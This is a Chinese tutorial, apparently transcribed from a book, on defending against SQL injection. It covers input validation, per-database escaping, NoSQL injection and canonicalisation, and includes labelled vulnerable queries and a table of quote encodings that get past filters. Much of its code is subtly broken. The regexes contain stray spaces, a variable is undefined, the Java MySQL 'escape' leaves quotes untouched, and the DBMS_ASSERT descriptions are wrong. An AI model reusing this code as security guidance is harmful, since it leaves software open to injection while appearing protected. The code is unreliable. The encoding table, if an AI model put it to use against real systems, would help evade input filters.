<p>定义一个输入验证类，该类实现了<code>javax.faces.validator.Validator</code>接口</p>
<p>请参考下列代码片段并将其作为验证JSF(Java Server Faces, JSF)中用户名的例子</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UsernameValidator</span> <span class="token keyword">implements</span> <span class="token class-name">Validator</span> <span class="token punctuation">{</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token class-name">FacesContext</span> facesContext<span class="token punctuation">,</span>
<span class="token class-name">UIComponent</span> uIComponent<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ValidatorException</span><span class="token punctuation">{</span>
<span class="token comment">//获取用户名并转换为一个字符串</span>
<span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>value<span class="token punctuation">;</span>
<span class="token comment">//建立正则表达式</span>
<span class="token class-name">Pattern</span> p <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span>compile <span class="token punctuation">(</span><span class="token string">"^[a-zA-z] {8, 12}$"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//匹配用户名</span>
<span class="token class-name">Matcher</span> m <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>matchFound<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token class-name">FacesMessage</span> message <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FacesMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
message<span class="token punctuation">.</span><span class="token function">setDetail</span><span class="token punctuation">(</span><span class="token string">"Not valid - it must be 8-12 letter only"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
message<span class="token punctuation">.</span><span class="token function">setSummary</span><span class="token punctuation">(</span><span class="token string">"Username not valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
message<span class="token punctuation">.</span><span class="token function">setseverity</span><span class="token punctuation">(</span><span class="token class-name">FacesMessage</span><span class="token punctuation">.</span><span class="token constant">SEVERITY_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ValidatorException</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要将下列内容添加到faces-config.xml文件中以便启用上述验证器</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>validator</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>validator-id</span><span class="token punctuation">&gt;</span></span>namespace.UsernameValidator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>validator-id</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>validator-class</span><span class="token punctuation">&gt;</span></span>namespace.package.UsernameValidator<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>validatorclass</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>validator</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来可以在相关的JSP文件中引用在faces-config.xml文件中添加的内容</p>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;h:inputText value="username" id="username"
required="true"&gt;&lt;f:validator
validatorId="namespace.UsernameValidator" /&gt;
&lt;/h:inputText&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在Java中实现输入验证时，还有一种很有用的资源OWASP ESAPI(Enterprise Security API)，包括org.owasp.esapi.reference.DefaultValidator输入验证类的实现，可以直接使用它，也可以将它作为自定义输入验证引擎的参考实现。</p>
<h4 id="NET中的输入验证"><a href="#NET中的输入验证" class="headerlink" title=".NET中的输入验证"></a>.NET中的输入验证</h4><p>ASP.NET提供了<code>Regular-Expression Validator</code>控件和<code>Custom Validator</code>控件，执行客户端验证。</p>
<p>下列代码是使用<code>RegularExpressionValidator</code>验证用户名的例子，用户名中只能包含字母(大写和小写)并且总长度必须介于8到12个字符之间。</p>
<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&amp;ltasp:textbox id="userName" runat="server"/&gt;
&amp;ltasp:RegularExpressionValidator id="usernameRegEx" runat="server" ControlToValidate="userName"
ErrorMessage="Username must contain 8 - 12 letters only."
ValidationExpression="^[a-zA-Z]{8,12}$" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来的代码片段是使用<code>CustomValidator</code>验证口令是否为正确格式的例子。创建两个用户定义函数<code>PwdValidate</code>位于服务器上，负责对口令值进行验证；<code>ClientPwdValidate</code>位于客户端的JavaScript或VBScript中，负责对用户浏览器上的口令值进行验证。</p>
<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&amp;ltasp:textbox id= "txt Pas sword" runat="server"/&gt;
&amp;ltasp:CustomValidator runat="server" ControlToValidate="txtPassword"
ClientValidationFunction="ClientPwdValidate"
ErrorMessage="Password does not meet requirements."
OnServerValidate="PwdValidate" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="PHP中的输入验证"><a href="#PHP中的输入验证" class="headerlink" title="PHP中的输入验证"></a>PHP中的输入验证</h4><p>PHP不直接依赖于表示层，因而PHP中的输入验证支持属于所使用的框架。许多PHP应用程序直接在代码中实现输入验证。</p>
<p>可以使用PHP中的很多函数作为构造输入验证的基本构造块，包括：</p>
<ul>
<li><p>preg_match(regex,matchstring):使用正则表达式regex对 matchstring执行正则表达式匹配。</p>
</li>
<li><p>is_&lt;type＞(input):检查输入是否＜type＞，例如 is_numeric()。</p>
</li>
<li><p>strlen(input)：检查输入的长度。</p>
</li>
</ul>
<p>使用preg_match验证表单参数：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^[a-zA-Z] {8, 12}$/D"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token comment">//处理验证失败的情况</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="在移动应用程序中检验输入"><a href="#在移动应用程序中检验输入" class="headerlink" title="在移动应用程序中检验输入"></a>在移动应用程序中检验输入</h4><p>移动应用程序中的数据既可以存储在远程服务器上，也可以存储在本地的应用中。对于这两种情况都需要在本地检验输入。对于远程存储的数据，需要在远程服务器端对输入进行检查。</p>
<p>可以采用两种方式对输入搜索(in-device input)的输入数据进行检验。可以使用一种仅支持我们所期望数据类型的输入域类型(field type)，比如使用仅支持输入数字的输入域。另外也可以订阅输入域的change事件，当接收到无效输入时由事件处理程序进行处理。Android支持输入过滤器(input filter)的概念，它可以将一个或多个InputFilter的实现自动地应用于数据，并且可以拒绝无效的输入。</p>
<h4 id="在HTML5中检验输入"><a href="#在HTML5中检验输入" class="headerlink" title="在HTML5中检验输入"></a>在HTML5中检验输入</h4><p>在开发HTML5应用程序时，数据可以存储在Web浏览器的本地存储中，也可以存储在承载HTML5Web应用程序的远程Web服务器上。对于存储在浏览器本地存储中的数据，可以使用JavaScript检验数据，或者使用HTML5提供的新类型的＜input＞输入域进行检验。这些＜input＞输入域支持required属性，该属性指示浏览器检查在该输入域中必须具有输入值。此外，还支持pattern属性，允许开发人员设置一个正则表达式，输入的数据必须满足该正则表达式的约束：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;input type="text" required= "required" pattern:"^[0-9] {4}...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果客户端应用程序正把数据发送回服务器端的应用程序， 那么服务器端代码必须总是重新检验它从HTML5应用程序中接收到的输入数据。</p>
<h3 id="编码输出"><a href="#编码输出" class="headerlink" title="编码输出"></a>编码输出</h3><h4 id="编码发送给数据库的内容"><a href="#编码发送给数据库的内容" class="headerlink" title="编码发送给数据库的内容"></a>编码发送给数据库的内容</h4><p>有时白名单过滤并不能完全，可能还会动态拼接产生SQL注入，对于无法或不适合使用参数化语句的情况，有必要对发送给数据库的数据进行编码（或引用）</p>
<h5 id="针对Oracle的编码"><a href="#针对Oracle的编码" class="headerlink" title="针对Oracle的编码"></a>针对Oracle的编码</h5><p>Oracle使用单引号作为字符串的结束符，因而有必要对包含在字符串（动态SQL中将包含该字符串）中的单引号进行编码。</p>
<p>在Oracle中，可以通过使用两个单引号替换单个单引号的方法来实现编码目的。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"''"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>由于在PL/SQL中需要为单引号添加引用符（因为它是字符串结束符），因而在PL/SQL中需要使用两个单引号来替换单个单引号。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">sql <span class="token operator">=</span> <span class="token function">replace</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> '''<span class="token char">','</span>'''''''<span class="token punctuation">)</span>；
sql <span class="token operator">=</span> <span class="token function">replace</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token function">CHR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">CHR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">CHR</span><span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>对LIKE字句的通配符转义</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a%'</span>
<span class="token comment">-- 易受攻击。返回所有以"a'字符开头的用户</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a\%'</span> <span class="token keyword">ESCAPE</span> <span class="token string">'\'
-- 不容易受攻击，返回用户'</span>a<span class="token operator">%</span><span class="token string">',如果存在一个这样的用户的话
'</span>
<span class="token comment">-- 使用ESCAPE子句时，可以指定任何单个字符作为转义字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>“q”引用，采用 q’[QUOTE CHAR]string[QUOTE CHAR]’格式。引用字符(quote character)可以是任何未出现在字符串中的单个字符</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">q<span class="token string">'(5%)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果无法使用参数化查询，就应该使用dbms_assert包来执行输入验证。dbms_assert提供了7个不同的函数(ENQUOTE_LITERAL、ENQUOTE_ NAME、NOOP、QUALIFIED_SQL_NAME、 SCHEMA_NAME、SIMPLE_SQL_NAME和SQL_OBJECT_NAME)来验证不同类型的输入。</p>
<p>一个未使用dbms_assert的非安全查询(FIELD、OWNER和TABLE中存在SQL注入)：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">execute</span> immediate <span class="token string">'select'</span><span class="token operator">||</span> FIELD <span class="token operator">||</span><span class="token string">'from'</span><span class="token operator">||</span> OWNER <span class="token operator">||</span><span class="token string">'.'</span><span class="token operator">||</span> <span class="token keyword">TABLE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下面是相同的查询，不过使用了dbms_assert进行输入验证：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">execute</span> immediate <span class="token string">'select '</span> <span class="token operator">||</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>SIMPLE_SQL_NAME<span class="token punctuation">(</span>FIELD<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'from'</span> <span class="token operator">||</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>ENQUOTE_NAME
<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>SCHEMA_NAME<span class="token punctuation">(</span>OWNER<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">FALSE</span><span class="token punctuation">)</span>
<span class="token operator">||</span><span class="token string">'.'</span><span class="token operator">||</span>sys<span class="token punctuation">.</span>dbms_assert<span class="token punctuation">.</span>QUALIFIED_SQL_NAME<span class="token punctuation">(</span><span class="token keyword">TABLE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>dbms assert 函数</p>
<table>
<thead>
<tr>
<th align="left">函   数</th>
<th>描   述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">DBMS_ASSERT.SCHEMA_NAME</td>
<td>该函数检查传递的字符串是否为数据库中存在的对象</td>
</tr>
<tr>
<td align="left">DBMS_ASSERT.SIMPLE_SQL_NAME</td>
<td>该函数检查SQL元素中是否只包含A-Z、a-z、0-9、$、 #和_这样的字符。如果使用双引号来引用参数，那么允许使用除双引号之外的所有字符</td>
</tr>
<tr>
<td align="left">DBMS_ASSERT.SQL_OBJECT_NAME</td>
<td>该函数检查传递的字符串是否为数据库中存在的对象</td>
</tr>
<tr>
<td align="left">DBMS_ASSERT.QUALIFIED_SQL_NAME</td>
<td>该函数与SIMPLE_SQL_NAME非常类似，不过它还允许数据库连接</td>
</tr>
<tr>
<td align="left">DBMS_ASSERT.ENQUOTE_LITERAL</td>
<td>该函数使用双引号来引用传递的参数。如果参数已被引用，就不做任何事情</td>
</tr>
<tr>
<td align="left">DBMS_ASSERT.ENQUOTE_NAME</td>
<td>如果未使用单引号引用用户提供的字符串，那么该函数会使用单引号来引用它</td>
</tr>
</tbody></table>
<h5 id="针对MS-SQL的编码"><a href="#针对MS-SQL的编码" class="headerlink" title="针对MS-SQL的编码"></a>针对MS-SQL的编码</h5><p>MS-SQL使用单引号作为字符串的结束符，因而有必要对包含在字符串（动态SQL中将包含该字符串）中的单引号进行编码。</p>
<p>在MS-SQL中，可以通过使用两个单引号替换单个单引号的方法来实现编码目的。</p>
<pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">sql = sql.replace("'","''")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>由于在Transact-SQL中需要为单引号添加引用符(因为它是字符串结束符)，因而在Transact-SQL中需要使用两个单引号来替换单个单引号。</p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">SET @enc = replace(@input,'''','''''''')
//使用字符编码表示上述内容逻辑性会更强，也更加清楚：
SET @enc = replace(@input, CHAR(39), CHAR(39) + CHAR(39));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>对LIKE字句的通配符转义</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">Replace</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">,</span><span class="token string">"[[]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">Replace</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">,</span><span class="token string">"[%]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">Replace</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"[_]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a%'</span>
<span class="token comment">-- 易受攻击。返回所有以"a'字符开头的用户</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">WHERE</span> name <span class="token operator">LIKE</span> <span class="token string">'a\%'</span> <span class="token keyword">ESCAPE</span> <span class="token string">'\'
-- 不容易受攻击，返回用户'</span>a<span class="token operator">%</span><span class="token string">',如果存在一个这样的用户的话
'</span>
<span class="token comment">-- 使用ESCAPE子句时，可以指定任何单个字符作为转义字符</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="针对MySQL的编码"><a href="#针对MySQL的编码" class="headerlink" title="针对MySQL的编码"></a>针对MySQL的编码</h5><p>由于MySQL使用单引号作为字符串字面量的结束符，因而有必要对包含在字符串(动态SQL中将包含该字符串)中的单引号进行编码。</p>
<p>在MySQL中，使用两个单引号替换单个单引号来实现编码目的，也可以使用反斜线()来引用单引号。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">sql <span class="token operator">=</span> sql<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">"\'"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>PHP还提供了mysql_real_escape()函数。该函数会自动使用反斜线来引用单引号及其他具有潜在危害的字符，例如0x00(NULL)、换行符(\n)、回车符(\r)、双引号(“)、反斜线() 和 Ox1A(Ctrl+Z)</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>由于需要为单引号添加引用符(因为它是字符串结束符)，因而在存储过程代码中需要使用两个单引号来替换单个单引号。</p>
<pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">SET @sql = REPLACE(@sql,'\'','\\\'')
//使用字符编码表示上述内容逻辑性会更强，也更加清楚：
SET @enc = REPLACE(@input, CHAR(39) , CHAR(92, 39));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>对LIKE字句的通配符转义</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">,</span><span class="token string">"\%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span><span class="token string">"\_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="针对PostgreSQL的编码"><a href="#针对PostgreSQL的编码" class="headerlink" title="针对PostgreSQL的编码"></a>针对PostgreSQL的编码</h5><p>PostgreSQL也使用单引号作为字符串字面量的结束符，可以采用两种办法对单引号进行编码。</p>
<p>第一种方法使用两个单引号替换一个单引号。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$encodedValue</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"''"</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>第二种办法是使用一个反斜线对单引号进行编码，但PostgreSQL还需要在字符串字面量之前放置一个大写的E字母</p>
<pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> User <span class="token keyword">WHERE</span> LastName<span class="token operator">=</span>E<span class="token string">'O\'Boyle'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在PHP中，可以使用add_slashes()或str_replace()方法对反斜线执行编码。在PHP中，对于PostgreSQL数据库而言，最佳的字符串编码方式是使用pq_escape_string()方法：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$encodedValue</span> <span class="token operator">=</span> <span class="token function">pg_escape_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>该函数将调用libpq的PQescapeString()方法，它将把单反斜线替换为双反斜线，并且用两个单引号替换一个单引号</p>
<p>在PostgreSQL中还可以采用其他办法创建字符串字面量，即使用$字符。$字符允许开发人员在SQL语句中使用类似于标记(tag-like)的功能。下面就是一个使用这种语法创建的字符串：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">User</span> <span class="token keyword">WHERE</span> LastName<span class="token operator">=</span>$quote$O'Boyle$quote$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在这种情况下，对于用户输入的任何一个$字符，都需要确保使用一个反斜线进行转义处理： </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$encodedValue</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\$"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="防止NoSQL注入"><a href="#防止NoSQL注入" class="headerlink" title="防止NoSQL注入"></a>防止NoSQL注入</h5><p>在NoSQL的查询API中，绝大多数方法都提供了将数据与代码清晰分离的方法。例如，当从PHP中使用MongoDB时，典型的方法是使用关联数组(associative array)插入数据：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$users</span><span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span><span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span> <span class="token operator">=&gt;</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查询则如下所示：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$users</span><span class="token operator">-&gt;</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span> <span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>当使用这些API时，由于避免了使用字符串连接来构造查询，因此防止了注入攻击。</p>
<p>对于更高级的查询，MongoDB允许开发人员使用$where关键字提交一个JavaScript函数：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$where"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"function(){ return this.username.indexOf('<span class="token interpolation"><span class="token variable">$test</span></span>') &gt; -1 }"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>该JavaScript函数很容易遭到注入攻击。攻击者可以转义indexOf()内的字符串，并改变查询执行的方式。为了防止这种攻击，我们必须对JavaScript进行编码。使用十六进制的\xnn编码类型，或使用\unnnn类型的Unicode编码，对所有非字母或数字的字符全部进行转 义，这是最安全的办法。</p>
<h3 id="规范化"><a href="#规范化" class="headerlink" title="规范化"></a>规范化</h3><p>避开输入验证和输出编码的常用技术是：在将输入发送给应用程序之前对其进行编码，之后再对其进行解码和解释以符合攻击者的目标。</p>
<p>单引号的例子</p>
<table>
<thead>
<tr>
<th align="center">表示</th>
<th align="center">编码类型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">%27</td>
<td align="center">URL编码</td>
</tr>
<tr>
<td align="center">%2527</td>
<td align="center">双URL编码</td>
</tr>
<tr>
<td align="center">%%317</td>
<td align="center">嵌套的双URL编码</td>
</tr>
<tr>
<td align="center">%u0027</td>
<td align="center">Unicode 表示</td>
</tr>
<tr>
<td align="center">%u02b9</td>
<td align="center">Unicode 表示</td>
</tr>
<tr>
<td align="center">%ca%b9</td>
<td align="center">Unicode 表示</td>
</tr>
<tr>
<td align="center">&amp;apos</td>
<td align="center">HTML实体</td>
</tr>
<tr>
<td align="center">&amp;#39</td>
<td align="center">十进制HTML实体</td>
</tr>
<tr>
<td align="center">&amp;#x27</td>
<td align="center">十六进制HTML实体</td>
</tr>
<tr>
<td align="center">%26apos</td>
<td align="center">混合的URL/HTML编码</td>
</tr>
</tbody></table>
<p>规范化是指将输入简化成标准或简单的形式，例如变成单引号</p>
<h4 id="规格化方法"><a href="#规格化方法" class="headerlink" title="规格化方法"></a>规格化方法</h4><ul>
<li>拒绝所有不符合格式的输入，例如利用白名单拒绝所有编码输入</li>
<li>对输入多次解码，或者解码一次，若还需解码就抛弃</li>
</ul>
<h5 id="适用于Unicode的方法"><a href="#适用于Unicode的方法" class="headerlink" title="适用于Unicode的方法"></a>适用于Unicode的方法</h5><p>遇到像UTF-8这样的Unicode输入时，一种方法是将输入标准化（normalization）。该方法使用定义好的规则集将Unicode转换成最简单的形式。将双倍宽度及其他的Unicode编码在它们所处的位置转换成各自的ASCII 等价形式。</p>
<p>使用Java中的Normalizer类（Java 6及以上版本）来将输入标准化</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">normalized <span class="token operator">=</span> <span class="token class-name">Normalizer</span><span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span><span class="token class-name">Normalizer<span class="token punctuation">.</span>Form</span><span class="token punctuation">.</span><span class="token constant">NFKC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用C#中String类的Normalize方法来将输入标准化</p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">normalized = input.Normalize(NormalizationForm.FormKC);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用PHP中PEAR库的PEAR::I18N_UnicodeNormalizer包来将输入标准化</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$normalized</span> <span class="token operator">=</span> <span class="token class-name static-context">I18N_UnicodeNormalizer</span><span class="token operator">::</span><span class="token function">toNFKC</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>还有一种方法是首先检查Unicode是有效的，然后将数据转换成一种可预见的格式，例如像ISO-8859-1这样的西欧字符集。</p>
<p>用于解析UTF-8的正则表达式</p>
<table>
<thead>
<tr>
<th align="center">正则表达式</th>
<th align="center">描   述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[x00-\x7F]</td>
<td align="center">ASCII</td>
</tr>
<tr>
<td align="center">[\xC2-\xDF][\x80-\xBF]</td>
<td align="center">双字节表示</td>
</tr>
<tr>
<td align="center">\xE0[\xA0-\xBF][\x80-\xBF]</td>
<td align="center">双字节表示</td>
</tr>
<tr>
<td align="center">[\xEl-\xEC\xEE\xEF][\x80-\xBF] {2}</td>
<td align="center">三字节表示</td>
</tr>
<tr>
<td align="center">\xED [\x80-\x9F][\x80-\xBF]</td>
<td align="center">三字节表示</td>
</tr>
<tr>
<td align="center">\xFO [\x90-\xBF][\x80-\xBF] {2}</td>
